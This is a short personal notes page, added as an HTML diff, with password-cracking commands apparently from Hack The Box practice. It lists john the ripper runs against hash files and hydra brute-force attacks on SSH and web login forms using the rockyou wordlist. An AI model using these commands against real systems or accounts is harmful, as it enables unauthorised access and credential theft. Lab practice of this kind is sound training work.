@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>passwords</title>
+
+        <link rel="stylesheet" href="css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Notes</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>passwords</h1>
+    <div class="blog-post-subheader">
+        December 17, 2018
+    </div>
+    <div class="blog-post-content">
+        <p><pre><code>
+#john
+john &ndash;format=crypt &ndash;wordlist=rockyou.txt &ndash;session=two hashes.txt
+john &ndash;format=NT &ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt<br />
+#hydra
+hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &lsquo;/index.php:password=^PASS^:F=Invalid password!&rsquo;
+hydra -L users -P passwords 10.10.10.111 ssh
+hydra 10.10.10.153 http-post-form &ldquo;/moodle/login/index.php:username=^USER^&amp;password=^PASS^:F=Invalid login, please try again&rdquo; -l giovanni -P list -t 10 -w 30
+hash-identifier</p>
+
+<p>hydra -l sammy -P rockyou.txt 10.10.10.76 -t 4 -s 22022 ssh
+</pre></code></p>
+
+    </div>
+</section>
+
+    </body>
+</html>
